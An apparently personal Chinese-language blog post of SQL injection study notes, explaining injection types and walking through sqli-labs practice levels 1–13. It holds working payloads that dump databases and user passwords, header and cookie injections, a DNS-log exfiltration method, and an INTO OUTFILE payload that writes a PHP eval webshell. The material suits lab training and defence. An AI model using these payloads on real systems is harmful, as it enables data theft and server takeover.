<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL注入 | MTRleed</title><meta name="keywords" content="注入"><meta name="author" content="MTRleed"><meta name="copyright" content="MTRleed"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入此文是基于MySQL数据库的学习记录 认识sql注入 sql注入是一种web应用代码漏洞，在与数据库有交互的地方没有对用户的输入做好限制且没有对传入数据的进行过滤，通过构造特殊的请求，使web应用执行附加条件的sql语句以此返回想要的信息，实现对数据库的任意查询 常见sql注入的类型：   1.显错注入  2.报错注入 3.布尔盲注 4.延时注入（基于时间的盲注） 5.http-head">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入">
<meta property="og:url" content="https://www.mtrleed.top/post/7/index.html">
<meta property="og:site_name" content="MTRleed">
<meta property="og:description" content="SQL注入此文是基于MySQL数据库的学习记录 认识sql注入 sql注入是一种web应用代码漏洞，在与数据库有交互的地方没有对用户的输入做好限制且没有对传入数据的进行过滤，通过构造特殊的请求，使web应用执行附加条件的sql语句以此返回想要的信息，实现对数据库的任意查询 常见sql注入的类型：   1.显错注入  2.报错注入 3.布尔盲注 4.延时注入（基于时间的盲注） 5.http-head">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/sql%E6%B3%A8%E5%85%A5.jpg">
<meta property="article:published_time" content="2021-08-06T16:00:00.000Z">
<meta property="article:modified_time" content="2023-03-01T13:38:44.309Z">
<meta property="article:author" content="MTRleed">
<meta property="article:tag" content="注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/sql%E6%B3%A8%E5%85%A5.jpg"><link rel="shortcut icon" href="/img/aa.png"><link rel="canonical" href="https://www.mtrleed.top/post/7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-01 21:38:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/js/myjs.js"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="MTRleed" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/ig.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/sql%E6%B3%A8%E5%85%A5.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MTRleed</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-06T16:00:00.000Z" title="发表于 2021-08-07 00:00:00">2021-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-01T13:38:44.309Z" title="更新于 2023-03-01 21:38:44">2023-03-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>此文是基于MySQL数据库的学习记录</p>
<h2 id="认识sql注入"><a href="#认识sql注入" class="headerlink" title="认识sql注入"></a>认识sql注入</h2><ol>
<li>sql注入是一种web应用代码漏洞，在与数据库有交互的地方没有对用户的输入做好限制且没有对传入数据的进行过滤，通过构造特殊的请求，使web应用执行附加条件的sql语句以此返回想要的信息，实现对数据库的任意查询</li>
<li>常见sql注入的类型：</li>
</ol>
<blockquote>
<p>1.显错注入 </p>
<p>2.报错注入</p>
<p>3.布尔盲注</p>
<p>4.延时注入（基于时间的盲注）</p>
<p>5.http-header注入(User-Agent 和 Cookie)</p>
<p>6.堆叠注入</p>
<p>7.DNS_log注入</p>
</blockquote>
<p>3.sql注入的作用：</p>
<blockquote>
<p>1.绕过登陆验证</p>
<p>2.获取敏感信息</p>
<p>3.文件操作（读写，传马）</p>
<p>4.执行系统命令（UDF）</p>
</blockquote>
<h2 id="sql注入类型详解"><a href="#sql注入类型详解" class="headerlink" title="sql注入类型详解"></a>sql注入类型详解</h2><p>1.显错注入： 也称为联合注入，因为在显错注入里最常用的查询语句结构就是 union 联合查询。这种注入方式的前提是我们可以看到想要的回显，数据库的执行结果 <strong>直接显示</strong> 到页面上，常用的步骤：</p>
<blockquote>
<p>1.判断注入点是否存在**?id=1’ **报错就存在sql注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错</p>
<p>2.使用 <strong>order by</strong> 判断字段(“少准对 多错”)</p>
<p>3.使用 <strong>union select</strong> 联合查询查看显示位，注意：要保证union 前面的查询错误才会显示后面的查询， 例如: <strong>?id=-123 union select 1,2,3,4– -</strong></p>
<p>4.在显示位上使用查询 库、表、字段、字段内容 的sql语句</p>
</blockquote>
<p>2.报错注入： 前提是对方服务器开启了报错显示服务。利用报错服务获取数据库数据的操作就是报错注入，通常与 **union select **连用；一般步骤：</p>
<blockquote>
<p>1.判断是否存在注入点（同上）</p>
<p>2.故意构造报错语句，这里我们常用的3个函数 <strong>updatexml(XML_document, XPath_string, new_value)</strong>  、<strong>floor()</strong>  、<strong>extractvalue(XML_document，xpath_string)</strong> </p>
<p>例如：**?id=-1’ union select updatexml(1,concat(‘.’,(select group_concat(schema_name)from information_schema.schemata)),1);– -**</p>
<p>解释两个函数：</p>
<p>1.<strong>updatexml(XML_document, XPath_string, new_value)</strong>  用来更新XML文档，该函数有3个参数。 </p>
<p>第一个参数：是string格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：代表路径，Xpath格式的字符串例如    //title【@lang】 </p>
<p>第三个参数：string格式，替换查找到的符合条件的数据</p>
<p>updatexml使用时，1、3参数可以全写阿拉伯数字，不影响。主要使用的是第2参数的格式错误。当<strong>xpath_string</strong>格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）但是最多返回<strong>32位</strong></p>
<p>例如 爆库名 构造payload：**?id=-1’ union select updatexml(1,concat(‘~’,(select group_concat(schema_name)from information_schema.schemata)),1);– -**</p>
<p>2.<strong>extractvalue(XML_document，xpath_string)</strong>  此函数用来从目标XML中返回包含所查询值的字符串，有两个参数。</p>
<p>第一个参数：string格式，为XML文档对象的名称 </p>
<p>第二个参数：xpath_string（xpath格式的字符串）</p>
<p>extractvalue使用时，1参数可以写阿拉伯数字填充，不影响。当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）但是最多返回<strong>32位</strong></p>
<p><strong>?id=-1’ union select extractvalue(1,concat(‘~’,(select database())));– -</strong></p>
</blockquote>
<p>3.布尔盲注：当我们在注入时遇到有些网站没有输出点，且关闭了错误回显，这时我们可以考虑使用布尔盲注。盲注基本就是猜，费时费力。一般使用以下几个函数进行猜解。</p>
<blockquote>
<p>1.length()：函数的返回值为字符串的字节长度。</p>
<p>2.substr()：截取字符串，用法substr(string, start,length)</p>
<p>3.string-指定的要截取的字符串  start-规定在字符串的何处开始 length-指定要截取的字符串长度</p>
<p>4.ascii()：返回字符串中第一个字符的ascii值</p>
<p>使用演示：</p>
<h3 id="1-使用length-函数猜数据库名长度"><a href="#1-使用length-函数猜数据库名长度" class="headerlink" title="1.使用length()函数猜数据库名长度"></a>1.使用length()函数猜数据库名长度</h3><p>如length(database())&gt;10,页面显示正常</p>
<p>length(database())&gt;20,页面显示不正常</p>
<p>length(database())=9,页面显示正常</p>
<p>我们可以用二分法猜解得到数据库的长度</p>
<h3 id="2-利用ascii猜数据库名"><a href="#2-利用ascii猜数据库名" class="headerlink" title="2.利用ascii猜数据库名"></a>2.利用ascii猜数据库名</h3><p>and (ascii(substr(database(),1,1)))=100,如果页面返回正常，说明数据库名称第一位是d</p>
<h3 id="3-猜字段名"><a href="#3-猜字段名" class="headerlink" title="3.猜字段名"></a>3.猜字段名</h3><p>and (ascii(substr((select column_name from information_schema.columns where table_name=’aaa’ limit 0,1),1,1)))&gt;100</p>
</blockquote>
<p>4.延时注入(基于时间的盲注)：有时候我们会遇到一种情况，无论怎么操作页面都是返回正常，这时我们可以考虑用延时注入</p>
<blockquote>
<p>延时注入最常用的函数<strong>sleep()</strong></p>
<p>sleep()：执行挂起一段时间,也就是等待一段时间在继续执行</p>
<p>例：select * from users where id=1 and sleep(5);  /* 5秒之后执行SQL语句*/</p>
<p>if(expr1,expr2,expr3)：expr1为0或者null或者false，则返回 expr3 ; 否则，返回expr2。</p>
<p>构造语句：and if(ascii(substr(database(),1,1))=100,0,sleep(10))</p>
<p>如果库名第一个字符是d，则网页延时10秒</p>
</blockquote>
<p>5.http-header注入：通过构造 HTTP请求头来达到爆出数据库内容的方式。HTTP请求头内容很多，我们通常修改以下两个参数 <strong>User-Agent</strong>  和 <strong>Cookie</strong> (在使用之前要将请求头发送到 repeater 模块,才能修改)</p>
<blockquote>
<p>（User-Agent）一般步骤：</p>
<p>1.抓包，将包发送到repeater模块</p>
<p>2.将User-Agent删掉，自己构造一个 ，还是按照之前的思路，先输入一个单引号，然后放包，若页面显示报错，接下来的步骤就很简单了，制作一个能用的payload。比如:  <strong>User-Agent: 666’ or updatexml (1,concat (0x7e,database()),0) or ‘</strong></p>
<p>3.持续构造payload 查看不同数据</p>
<p>(Cookie) 一般步骤 ：</p>
<p>1.抓包，将包发送到<strong>repeater</strong>模块</p>
<p>2.例如我们现在账号后面加一个逗号，放包，若是页面显示错误，存在sql注入</p>
<p>3.构造payload ，将cookie 构造成 例如 <strong>Cookie: ant[uname]=admin’ and updatexml (1, concat (Ox7e, database()),0) or ‘;</strong></p>
</blockquote>
<p>6.堆叠注入: 就是同时执行两条以上的sql语句</p>
<blockquote>
<p>例如： <strong>‘;select * from admins;show database()</strong></p>
</blockquote>
<p>7.DNS_log注入：属于sql 注入的一种(oob在sql中的应用)  oob：数据外带。前提条件： secure_file_priv = “ ” 否则不行， 任意文件读取。</p>
<p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/1545399-20190329195347336-890312924.png">        </p>
<p><strong>效果</strong>：将盲注，时间注入 变成显错(联合)注入</p>
<p><strong>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息</strong><br><strong>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong></p>
<p><strong>利用场景:</strong></p>
<p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNS_log注入。</p>
<h2 id="sqli-靶场"><a href="#sqli-靶场" class="headerlink" title="sqli 靶场"></a>sqli 靶场</h2><h3 id="1关：’-闭合-显错报错"><a href="#1关：’-闭合-显错报错" class="headerlink" title="1关：’ 闭合 显错报错"></a><strong>1关：’ 闭合 显错报错</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3-- - //查显示位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span><span class="comment">-- - //查全库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">3</span><span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e)) from users),3-- - //查数据</span></span><br></pre></td></tr></table></figure>



<h3 id="2关：数字型注入-显错注入"><a href="#2关：数字型注入-显错注入" class="headerlink" title="2关：数字型注入  显错注入"></a><strong>2关：数字型注入  显错注入</strong></h3><p>payload 参考2关</p>
<h3 id="3关-‘-闭合-显错注入"><a href="#3关-‘-闭合-显错注入" class="headerlink" title="**3关: ‘) 闭合 显错注入 **"></a>**3关: ‘) 闭合 显错注入 **</h3><p>payload 参考2关</p>
<h3 id="4关：”-闭合-显错注入"><a href="#4关：”-闭合-显错注入" class="headerlink" title="4关：”) 闭合 显错注入"></a><strong>4关：”) 闭合 显错注入</strong></h3><p>payload 参考2关</p>
<h3 id="5关：’-闭合-报错注入"><a href="#5关：’-闭合-报错注入" class="headerlink" title="5关：’ 闭合 报错注入"></a><strong>5关：’ 闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select database())),1)-- -//查当前数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">-- - //查全库（使用limit 控制）</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1)-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)) ,<span class="number">1</span>)<span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select concat(id,0x7e,username,0x3A,password,0x7e)from users limit 0,1)),1)-- -//查数据</span></span><br></pre></td></tr></table></figure>



<h3 id="6关：”-闭合-报错注入"><a href="#6关：”-闭合-报错注入" class="headerlink" title="6关：” 闭合 报错注入"></a><strong>6关：” 闭合 报错注入</strong></h3><p>payload 参考5关</p>
<h3 id="7关：-“-闭合-文件写入"><a href="#7关：-“-闭合-文件写入" class="headerlink" title="7关： “)) 闭合  文件写入"></a><strong>7关： “)) 闭合  文件写入</strong></h3><p>上传木马，使用蚁剑连接</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union </span></span><br><span class="line"><span class="string">select 1,2,&#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);<span class="operator">&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy_pro\\999.php&quot; -- -</span></span><br><span class="line"><span class="string">bug：因为?id=1，所以上传的文件中会显示第1个用户的账号和密码。若?id=2，则上传的文件中会显示第2个用户的账号和密码。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>)) <span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&gt;&#x27;</span> <span class="keyword">into</span> outfile &quot;D:\\phpstudy_pro\\999.php&quot; <span class="comment">-- -</span></span><br><span class="line">则不会出现这种情况</span><br></pre></td></tr></table></figure>



<h3 id="8关：’-闭合-布尔盲注"><a href="#8关：’-闭合-布尔盲注" class="headerlink" title="8关：’ 闭合 布尔盲注"></a><strong>8关：’ 闭合 布尔盲注</strong></h3><h3 id="9关：’-闭合-时间盲注"><a href="#9关：’-闭合-时间盲注" class="headerlink" title="9关：’ 闭合 时间盲注"></a><strong>9关：’ 闭合 时间盲注</strong></h3><h3 id="10关：”-闭合-时间盲注"><a href="#10关：”-闭合-时间盲注" class="headerlink" title="10关：” 闭合 时间盲注"></a><strong>10关：” 闭合 时间盲注</strong></h3><h3 id="11关：’-闭合-显错注入"><a href="#11关：’-闭合-显错注入" class="headerlink" title="11关：’ 闭合 显错注入"></a><strong>11关：’ 闭合 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 猜字段payload ：uname<span class="operator">=</span>admin<span class="string">&#x27; order by 2#&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line"><span class="string">显示位：uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit </span><br><span class="line">查数据库：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata)##&amp;passwd=1&amp;submit=Submit 或uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata#<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br><span class="line"></span><br><span class="line">查表：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查字段：uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>andtable_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit Submit</span><br><span class="line"></span><br><span class="line">字段内容：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e))from users)##&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>



<h3 id="12关：”-闭合-显错注入，-同11关"><a href="#12关：”-闭合-显错注入，-同11关" class="headerlink" title="12关：”) 闭合 显错注入， 同11关"></a><strong>12关：”) 闭合 显错注入， 同11关</strong></h3><h3 id="13关：’-闭合-报错注入"><a href="#13关：’-闭合-报错注入" class="headerlink" title="13关：’) 闭合 报错注入"></a><strong>13关：’) 闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select database())),1)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看全部数据库：uname=admin&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> concat(schema_name)<span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit  <span class="operator">/</span><span class="operator">/</span>使用 limit控制输出内容 </span><br><span class="line"></span><br><span class="line">查看表：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看字段：uname=admin&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit <span class="operator">/</span><span class="operator">/</span>使用 limit 控制输出</span><br><span class="line"></span><br><span class="line">查看字段内容：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select concat(id,0x7e,username,0x3A,password,0x7e)from users limit 2,1)),1)##&amp;passwd=1&amp;submit=Submit  //使用 limit控制输出内容 </span></span><br></pre></td></tr></table></figure>



